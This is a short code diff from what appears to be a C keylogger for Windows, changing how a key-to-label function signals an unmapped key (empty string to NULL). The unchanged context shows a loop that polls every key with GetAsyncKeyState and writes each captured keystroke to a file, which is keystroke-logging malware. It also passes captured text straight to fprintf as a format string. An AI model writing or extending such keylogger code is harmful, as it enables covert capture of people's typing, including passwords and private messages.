@@ -149,7 +149,7 @@ const char* CaptureKeyPress(const int& key, const bool& clean) {
 		case VK_SLEEP:    { return "[SLEEP]";  break; }
 	}
 	
-	return "";
+	return NULL;
 }
 
 
@@ -169,7 +169,7 @@ int main(int argc, char* argv[]) {
 			if (GetAsyncKeyState(i) == -32767) {
 				
 				const char* key = CaptureKeyPress(i, clean);
-				if (!strcmp(key, "")) { continue; }
+				if (key == NULL) { continue; }
 				
 				printf("%s", key);
 				fprintf(f, key);
